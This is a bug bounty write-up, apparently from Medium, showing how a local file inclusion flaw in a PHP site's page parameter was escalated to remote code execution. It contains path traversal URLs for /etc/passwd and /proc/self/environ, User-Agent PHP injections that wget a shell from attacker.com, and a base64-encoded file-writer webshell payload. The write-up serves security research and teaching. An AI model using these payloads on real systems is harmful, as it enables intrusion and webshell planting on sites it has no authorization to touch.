---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-04_leveraging-lfi-to-rce-in-a-website-with-20000-users.md
original_filename: 2020-10-04_leveraging-lfi-to-rce-in-a-website-with-20000-users.md
title: Leveraging LFI to RCE in a website with +20000 users
category: documents
detected_topics:
- command-injection
- path-traversal
- api-security
tags:
- imported
- documents
- command-injection
- path-traversal
- api-security
language: en
raw_sha256: c6f3a87399b575fa6699c6f01fa564984c2d6bd540b3f10402d668e518fb5137
text_sha256: 21af91c0385047b5c624dd59c0a3deb48f26c38e6aa42a5c99a495b927efff06
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Leveraging LFI to RCE in a website with +20000 users

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-04_leveraging-lfi-to-rce-in-a-website-with-20000-users.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `c6f3a87399b575fa6699c6f01fa564984c2d6bd540b3f10402d668e518fb5137`
- Text SHA256: `21af91c0385047b5c624dd59c0a3deb48f26c38e6aa42a5c99a495b927efff06`


## Content

---
title: "Leveraging LFI to RCE in a website with +20000 users"
url: "https://medium.com/bugbountywriteup/leveraging-lfi-to-rce-in-a-website-with-20000-users-129050f9982b"
authors: ["Kleiton Kurti (@kleiton0x7e)"]
bugs: ["LFI", "RCE"]
publication_date: "2020-10-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4220
scraped_via: "browseros"
---

# Leveraging LFI to RCE in a website with +20000 users

Leveraging LFI to RCE in a website with +20000 users
kleiton0x7e
Follow
3 min read
·
Oct 4, 2020

755

2

Hello researchers and bug hunters! Recently I found an interesting attack vector which I would like to share with you. Without losing time, let’s jump into it.

Finding LFI vulnerability

Let’s browse through the website to see if we can find any interesting endpoint. Clicking to Contact Us leads to an interesting endpoint:

https://www.website.com/index.php?pg=contact.php
Press enter or click to view image in full size
contact.php

I began fuzzing the pg parameter and found that LFI was possible using the following payload:

https://www.website.com/index.php?pg=../../../../etc/passwd
Press enter or click to view image in full size

So far so good, we have LFI, but let’s try to increase the impact.

From LFI to RCE

Using all the possible known techniques to escalate an LFI vulnerability to RCE, I found that /proc/self/environ was readable to us. So entering the following code leaks information:

https://www.website.com/index.php?pg=../../../../proc/self/environ
Press enter or click to view image in full size

Nice! Analyzing the output, we can see that the file located under /proc/self/environ contains several environment variables such as HTTP_USER_AGENT.

Sweet, let’s fire up Burp Suite and let’s send a request by changing the User-Agent value. I tried adding the following values to User-Agent:

Tried system(), but no RCE:

User-Agent: <?system('wget http://attacker.com/shell.txt -O shell.php');?>

Tried exec(), but no RCE:

User-Agent: <?exec('wget http://attacker.com/shell.txt -O shell.php');?>

Tried phpinit(), but failed:

User-Agent: <?php phpinfo(); ?>

This is where I spent a lot of time, I forgot that I could try writing files inside the server, so I tried the following payload (I will explain it).

Get kleiton0x7e’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Let’s create a payload which we will use in User-Agent HTTP Header:

User-Agent: <?php $a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg=='); $file = fopen('nadeshot.php','w'); echo fwrite($file,$a); fclose($file); ?>
Explaining the used payload

The webshell is encoded in base64 and stored into the a variable. The original webshell php code is from: https://github.com/alita-ido/PHP-File-Writer/blob/master/lfi-writer.php

$a = base64_decode('webshell_base64_encoded_code_here');

After that, we are telling the server to write a file named nadeshot.php.

$file = fopen('nadeshot.php','w');

Then, the server will write the code (decoded base64) into nadeshot.php

echo fwrite($file,$a);

Then, the server will save the file:

fclose($file);

So, let’s try executing this whole payload in Burp Suite and let’s see what happens.

Press enter or click to view image in full size

We got Response 200 (OK), which is good. We hope our payload got executed as planned, so let’s check if it got successfully executed by going to: https://website.com/nadeshot.php

Press enter or click to view image in full size
webshell uploaded

Our webshell got uploaded into /nadeshot.php . Great, now let’s write a simple .txt file (trying not to harm the website) to see if it works.

Press enter or click to view image in full size

I will create a text file named nadeshot.txt, then click “Write”.

Going into https://website.com/nadeshot.txt will show up our text file. We successfully increased our impact from LFI to RCE.

Press enter or click to view image in full size
RCE achieved
